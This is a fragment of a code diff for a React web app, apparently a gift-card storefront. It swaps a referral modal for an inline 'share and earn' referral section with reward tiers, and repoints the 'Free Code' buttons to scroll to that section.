+                      {shareCount}/{tier.count} Shares
+                    </p>
+                  </div>
+                )}
+              </motion.div>
+            );
+          })}
+        </div>
+
+        <div className="flex flex-col sm:flex-row items-center justify-center gap-4">
+          <button 
+            onClick={handleShare}
+            className="px-8 py-4 bg-white text-indigo-600 rounded-2xl font-black text-lg hover:bg-indigo-50 transition-all shadow-xl flex items-center gap-3 group"
+          >
+            <Share2 size={24} className="group-hover:rotate-12 transition-transform" />
+            SHARE & EARN NOW
+          </button>
+          <p className="text-indigo-100 text-sm font-medium">
+            * Rewards are given as random redeem codes.
+          </p>
+        </div>
+      </div>
+    </section>
   );
 };
 
@@ -451,7 +704,6 @@ export default function App() {
   const [selectedBrand, setSelectedBrand] = useState<string | null>(null);
   const [closingTime, setClosingTime] = useState('');
   const [isDarkMode, setIsDarkMode] = useState(false);
-  const [showReferral, setShowReferral] = useState(false);
 
   useEffect(() => {
     if (isDarkMode) {
@@ -505,16 +757,16 @@ export default function App() {
             onClose={() => setSelectedCard(null)} 
           />
         )}
-        {showReferral && (
-          <ReferralModal onClose={() => setShowReferral(false)} />
-        )}
       </AnimatePresence>
 
       {/* Floating Referral Button */}
       <motion.button
         whileHover={{ scale: 1.1 }}
         whileTap={{ scale: 0.9 }}
-        onClick={() => setShowReferral(true)}
+        onClick={() => {
+          const el = document.getElementById('referral');
+          el?.scrollIntoView({ behavior: 'smooth' });
+        }}
         className="fixed bottom-24 right-6 z-50 w-14 h-14 bg-emerald-600 text-white rounded-full shadow-2xl flex items-center justify-center group overflow-hidden"
       >
         <motion.div
@@ -541,7 +793,10 @@ export default function App() {
           
           <div className="flex items-center gap-4">
             <button 
-              onClick={() => setShowReferral(true)}
+              onClick={() => {
+                const el = document.getElementById('referral');
+                el?.scrollIntoView({ behavior: 'smooth' });
+              }}
               className="hidden md:flex items-center gap-2 px-4 py-2 bg-emerald-600 text-white rounded-xl font-bold text-xs hover:bg-emerald-700 transition-all shadow-lg shadow-emerald-100 dark:shadow-none"
             >
               <Gift size={16} /> Free Code
@@ -671,6 +926,11 @@ export default function App() {
                 <p className="text-sm text-gray-500 dark:text-gray-400 leading-relaxed">Need help? Our team is available on WhatsApp and Email around the clock.</p>
               </div>
             </section>
+
+            {/* Referral Section */}
+            <div id="referral">
+              <ReferralSection />
+            </div>
           </main>
         </motion.div>
       ) : activeView === 'brand' ? (
